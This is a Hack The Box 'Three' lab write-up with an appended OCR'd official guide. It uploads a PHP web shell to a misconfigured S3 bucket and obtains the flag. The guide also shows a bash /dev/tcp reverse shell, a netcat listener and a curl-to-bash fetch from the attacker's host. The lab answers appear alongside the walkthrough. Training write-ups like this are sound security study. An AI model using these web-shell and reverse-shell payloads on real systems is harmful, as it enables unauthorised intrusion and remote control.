---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Three"
uuid: c18c3302-3314-11ed-a39a-327ebed86db8
version: 288
created: Tue, 13 Sep 2022 03:32:54 +0000
tags:
- y-type/resource
- z-class/career/pentest
- x-status/publish/writeup
---

**TASK 1**

**How many TCP ports are open?** 2

```
$ nmap -sC -sT -sV $ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-13 06:53 BST
Nmap scan report for 10.129.218.174
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Toppers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.12 seconds
```

**TASK 2**

**What is the domain of the email address provided in the "Contact" section of the website?** thetoppers.htb

**TASK 3**

**In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?** /etc/hosts

**TASK 4**

**Which sub-domain is discovered during further enumeration?** s3.thetoppers.htb

将thetoppers.htb映射ip，写入到hosts文件中

开始爆破子域名

`ffuf -u http://PARAM.thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-topmillion-200000.txt:PARAM`

试了多个字典，都扫不出来

使用gobuster dns模式也扫不出来

使用gobuster vhost命令, 可以扫出来2个

返回码404和400，，所以没扫出来

![](/images/c18c3302-3314-11ed-a39a-327ebed86db8/6d5f001f-d98e-4fb5-bded-d3fe43052db5.png)

**TASK 5**

**Which service is running on the discovered sub-domain?** Amazon S3

**TASK 6**

**Which command line utility can be used to interact with the service running on the discovered sub-domain?** awscli

**TASK 7**

**Which command is used to set up the AWS CLI installation?** aws configure

**TASK 8**

**What is the command used by the above utility to list all of the S3 buckets?** aws s3 ls

**TASK 9**

**This server is configured to run files written in what web scripting language?** PHP

**SUBMIT FLAG** 

将s3.thetoppers.htb也添加到hosts文件中

`10.129.230.68 thetoppers.htb s3.thetoppers.htb`

根据[aws文档](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)，安装awscli

然后需要配置aws，随便输：`aws configure`

根据[aws文档](https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets)可得以下命令: `aws s3 ls s3://thetoppers.htb`

但报错了：

![](/images/c18c3302-3314-11ed-a39a-327ebed86db8/ca9b0d9d-fda3-4850-9719-8f487d6aa3c1.png) [^1]

通过错误信息可知，需要修改endpoint URL，根据[文档](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3/ls.html)可知参数为--endpoint-url

![](/images/c18c3302-3314-11ed-a39a-327ebed86db8/7161e1d1-c1a9-4b41-841c-74ebae27b251.png) [^2]

那么接下来就是上传后门文件shell.php 

![](/images/c18c3302-3314-11ed-a39a-327ebed86db8/77d27b99-531c-4b52-a8a9-c6a35433c880.png) [^3]

然后通过[url在线编码器](https://www.w3cschool.cn/tools/index?name=urlencode_decode)，编码命令就能得到flag了

http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt

**Note:**

ref: 

字典(dict) [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) 

[Configuration basics - AWS Command Line Interface (amazon.com)](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html) 

[https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/](https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/)  [Note](https://www.amplenote.com/notes/876fd216-33df-11ed-a709-5ac3aea65f93) 

[Three.pdf](/attachments/Three.pdf) [^4]

[^1]: I \[\*\]$ aws $3 Is $3://thetoppers. htb
    Could not connect to the endpoint URL: "https://s3. aws. amazonaws. com/thetoppers. htb?list-type=2&prefix=&del
    imiter=%2F&encoding-type=url"

[^2]: (kaliG kali ) - \[\~\]
    $ aws s3 Is s3: / /thetoppers. htb --endpoint-url http://s3. thetoppers. htb/
    PRE images/
    2022-09-13 08:32:08
    0 . htaccess
    2022-09-13 08:32:08
    11952 index . php

[^3]: (kali@ kali)-\[\~/Documents \]
    $ cat shell. php
    <?php system($_GET \["cmd" \] ) ; ?>
    (kali@ kali) -\[\~/Documents\]
    $ aws s3 sync .
    s3: //thetoppers. htb/ --endpoint-url http://s3. thetoppers. htb/
    upload: ./shell. php to s3://thetoppers . htb/shell. php

[^4]: Three Write-up
    Prepared by: dotguy
    Introduction
    Organizations of every type, size, and industry are using the cloud for a wide variety of use cases, such as
    data backup, storage, disaster recovery, email, virtual desktops, software development and testing, etc.
    Thus, it is crucial to have a secure configuration for a company's cloud infrastructure in order to protect
    against any attacks. Three is a Linux box that includes a website, which utilizes an AWS $3 bucket as its
    cloud-storage device. We can exploit this poorly configured $3 bucket and upload a reverse shell on it. We
    can then visit the corresponding URL to execute the reverse file and ultimately retrieve the flag.
    Note: Please allow the machine a few minutes to properly boot up after spawning as localstack
    needs a few minutes to load.
    Enumeration
    To start with, we will check for open ports using a Nmap scan:
    sudo nmap -sV 10.129.227.248
    ...
    sudo nmap -sV 10. 129.227.248
    Nmap scan report for thetoppers. htb (10.129.227.248)
    Host is up (0.21s latency).
    PORT
    STATE SERVICE VERSION
    22/tcp open ssh
    OpenSSH 7.6p1 Ubuntu 4ubuntu0. 7 (Ubuntu Linux; protocol 2.0)
    80/tcp open http
    Apache httpd 2.4.29 ( (Ubuntu) )
    The scan shows that two ports are open - port 80 (HTTP) and port 22 (SSH). Let's enumerate port 80
    using our web browser.
    HOME
    BAND
    TOUR
    CONTACT
    MORE
    Q
    THE BAND
    We love music
    We "The Toppers" are a group of five young men who truly believe that music can be pure art. We play a wide range of
    music and we love to interact with people during our performances. The concert will be the loudest, the most beautiful
    and the best! We know how to make
    vent into a festival! All of us have been performing together for over several
    years now, but still there is always something new to try. With the best musicians aside, we make any event into a
    festival.
    Music is an art that needs talent and materials. You can't bring the best artists and music instruments into an event
    without any preparation. Aside from this, we know how to collaborate with the best artists to create a memorable
    moment for your special day. All the facts are here
    you can read about us and the band for making your events into a
    festival.No matter what celebration you're hosting demands, we have the right ensemble to get the party started. Our
    full-service music bands can add to the fun at any gathering. from proms and school dances to weddings. We've
    performed at so many live concerts, college events, and private parties, you might not want to stop them from playing!
    John Smith
    Shane Marks
    Jim Tailer
    We can see a static webpage that features a concert ticket booking section but it isn't functional. Let's
    further try to identify the technology stack of the website using a browser extension known as Wappalyzer.
    It can be installed on the supported browsers from here.
    Once the Wappalyzer extension is installed, we can visit the website and then click on the extension icon to
    reveal the results.
    A
    Wappalyzer
    TECHNOLOGIES
    MORE INFO
    Export
    Font scripts
    Operating systems
    Font Awesome
    Ubuntu
    Google Font API
    CDN
    Web servers
    <>
    cdnjs
    Apache 2.4.29
    Cloudflare
    Programming languages
    php
    PHP
    Wappalyzer identifies PHP as the programming language being used by the website.
    Upon scrolling down the webpage, we come across the "Contact" section, which has email information. The
    email given here has the domain thetoppers. htb.
    CONTACT
    Fan? Drop a note!
    Chicago, US
    Name
    Email
    L
    Phone: +01 343 123 6102
    E
    Email: mail@thetoppers.htb
    Message
    SEND
    Let's add an entry for thetoppers. htb in the /etc/hosts file with the corresponding IP address to be able
    to access this domain in our browser.
    The /etc/hosts file is used to resolve a hostname into an IP address. By default, the /etc/hosts file is
    queried before the DNS server for hostname resolution thus we will need to add an entry in the
    /etc/hosts file for this domain to enable the browser to resolve the address for thetoppers . htb.
    echo "10.129.227.248 thetoppers. htb" \| sudo tee -a /etc/hosts
    Sub-domain enumeration
    What is a subdomain?
    A subdomain name is a piece of additional information added to the beginning of a website's domain name.
    It allows websites to separate and organize content for a specific function - such as a blog or an online
    store - from the rest of your website.
    For example, if we visit hackthebox.com we can access the main website. Or, we can visit
    ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the
    subdomain, hackthebox is the primary domain and com is the top-level domain (TLD). Although the URL
    changes slightly, you're still on HTB's website, under HTB's domain.
    Often, different subdomains will have different IP addresses, so when our system goes to look up the
    subdomain, it gets the address of the server that handles that application. It is also possible to have one
    server handle multiple subdomains. This is accomplished via "host-based routing", or "virtual host routing",
    where the server uses the Host header in the HTTP request to determine which application is meant to
    handle the request.
    As we have the domain thetoppers. htb, let us enumerate for any other sub-domains that may be present
    on the same server. There are different enumeration tools available for this purpose like gobuster , wfuzz ,
    feroxbuster etc. As of this writeup, we will be using gobuster for sub-domain enumeration using the
    following command.
    gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000. txt -u
    http://thetoppers.htb
    We will be using the following flags for gobuster .
    vhost : Uses VHOST for brute-forcing
    -W
    : Path to the wordlist
    -1
    : Specify the URL
    gobuster will send out requests with a host header that looks like the following for each word in the
    wordlist:
    Host: \[word\] . thetoppers. htb
    It will note the default response, and show any that return something different.
    ...
    gobuster vhost -w /usr/share/wordlists/secLists/subdomains-top1million-5060. txt -u http://thetoppers.htb
    Gobuster v3.1.0
    by 03 Reeves (@TheColonial ) & Christian Mehlmauer (@firefart)
    (+\] Url:
    http://thetoppers . htb
    \[+\] Method:
    GET
    \[+\] Threads:
    10
    \[+\] Wordlist:
    /usr/share/wordlists/secLists/subdomains-top1million-5000. txt
    User Agent:
    gobuster/3. 1.0
    (+\] Timeout :
    10s
    2022/07/28 16:40:33 Starting gobuster in VHOST enumeration mode
    Found: $3. thetoppers. htb (Status: 404) \[Size: 21\]
    \[\*\* SNIP \*\* \]
    The gobuster result shows that there exists a sub-domain called s3. thetoppers. htb. Let's also add an
    entry for this sub-domain in the /etc/hosts file.
    echo "10. 129.227.248 s3. thetoppers.htb" \| sudo tee -a /etc/hosts
    After we have added an entry for the domain to our hosts file let's visit s3. thetoppers . htb using a
    browser.
    O & $3.thetoppers.htb
    ("status": "running"}
    The webpage only contains the following JSON.
    ("status": "running"}
    Note: If instead of JSON you get a Proxy Error, give the box a few minutes to
    properly boot.
    What is an $3 bucket?
    A quick Google search containing the keywords "s3 subdomain status running" returns this result stating
    that s3 is a cloud-based object storage service. It allows us to store things in containers called buckets. AWS
    S3 buckets have various use-cases including Backup and Storage, Media Hosting, Software Delivery, Static
    Website etc. The files stored in the Amazon $3 bucket are called $3 objects.
    We can interact with this $3 bucket with the aid of the awscli utility. It can be installed on Linux using the
    command apt install awscli .
    First, we need to configure it using the following command.
    aws configure
    We will be using an arbitrary value for all the fields, as sometimes the server is configured to not check
    authentication (still, it must be configured to something for aws to work).
    aws configure
    AWS Access Key ID \[None\] : temp
    AWS Secret Access Key \[None\] : temp
    Default region name \[None\] : temp
    Default output format \[None\] : temp
    We can list all of the $3 buckets hosted by the server by using the Is command.
    aws --endpoint=http://s3. thetoppers .htb s3 1s
    aws --endpoint=http: / /s3. thetoppers . htb s3 Is
    2022-07-21 18:35:09 thetoppers . htb
    We can also use the Is command to list objects and common prefixes under the specified bucket.
    aws --endpoint=http://s3. thetoppers.htb s3 Is s3:/ /thetoppers.htb
    ...
    aws --endpoint=http://$3. thetoppers. htb s3 Is s3://thetoppers. htb
    PRE images/
    2022-07-21 18:35:09
    0 . htaccess
    2022-07-21 18:35:10
    11952 index . php
    We see the files index.php, . htaccess and a directory called images in the specified bucket. It seems like
    this is the webroot of the website running on port 80 . So the Apache server is using this $3 bucket as
    storage.
    awscli has got another feature that allows us to copy files to a remote bucket. We already know that the
    website is using PHP. Thus, we can try uploading a PHP shell file to the s3 bucket and since it's uploaded to
    the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
    will achieve remote code execution.
    We can use the following PHP one-liner which uses the system( ) function which takes the URL parameter
    emd as an input and executes it as a system command.
    <?php system($_GET\[ "cmd" \]) ; ?>
    Let's create a PHP file to upload.
    echo '<?php system( $_GET\[ "cmd" \]) ; ?> > shell.php
    Then, we can upload this PHP shell to the thetoppers. htb $3 bucket using the following command.
    aws --endpoint=http: //s3. thetoppers .htb s3 cp shell.php s3:/ /thetoppers.htb
    ...
    aws --endpoint=http://s3. thetoppers. htb s3 cp shell . php s3://thetoppers.htb
    upload: ./shell.php to s3://thetoppers. htb/shell.php
    We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
    executing the OS command id using the URL parameter cmd.
    http://thetoppers. htb/shell. php?cmd=id
    Q http://thetoppers.htb/shell.php?cmd=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    The response from the server contains the output of the OS command id, which verified that we have code
    execution on the box. Thus, let us now try to obtain a reverse shell.
    Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
    the specified listening port. We can obtain the tuno IP address of our local machine using the following
    command.
    ifconfig
    ...
    ifconfig
    \[\*\* SNIP \* \* \]
    tune: flags=4305<UP, POINTOPOINT, RUNNING, NOARP, MULTICAST> mtu 1500
    net 10. 10. 14.32 netmask 255.255.254.0 destination 10. 10. 14.32
    inet6 dead : beef :2: :10le prefixlen 64 scopeid 0x0<global>
    inet6 fe80: : a68e: a82f :9b2c: f4f1 prefixlen 64 scopeid 0x20<link>
    \[\*\* SNIP \*\*\]
    Let's get a reverse shell by creating a new file shell. sh containing the following bash reverse shell payload
    which will connect back to our local machine on port 1337 .
    #1/bin/bash
    bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
    We will start a neat listener on our local port 1337 using the following command.
    nc -nvip 1337
    nc -nvip 1337
    Ncat: Version 7.92 ( https :/ /nmap. org/ncat )
    Ncat: Listening on : : :1337
    Ncat: Listening on 0.0.0.0:1337
    Let's start a web server on our local machine on port 8000 and host this bash file. It is crucial to note here
    that this command for hosting the web server must be run from the directory which contains the reverse
    shell file. So, we must first traverse to the appropriate directory and then run the following command.
    python3 -m http. server 8000
    python3 -m http. server 8000
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/ ) ...
    We can use the curl utility to fetch the bash reverse shell file from our local host and then pipe it to bash
    in order to execute it. Thus, let us visit the following URL containing the payload in the browser.
    http://thetoppers. htb/shell. php?cmd=curl$20<YOUR_IP_ADDRESS>: 8000/shell. sh \| bash
    We receive a reverse shell on the corresponding listening port.
    Ncat: Version 7.92 ( https:/ /nmap. org/ncat )
    Ncat: Listening on : : :1337
    Ncat: Listening on 0.0.0.0:1337
    Ncat: Connection from 10.129.227.248.
    Ncat: Connection from 10. 129.227. 248:35172.
    www-data@three: /var/www/html$ id
    uid=33(www-data ) gid=33(www-data ) groups=33(www-data)
    The flag can be found at /var/www/flag. txt.
    cat /var/www/flag. txt
    Congratulations, you have successfully completed Three.

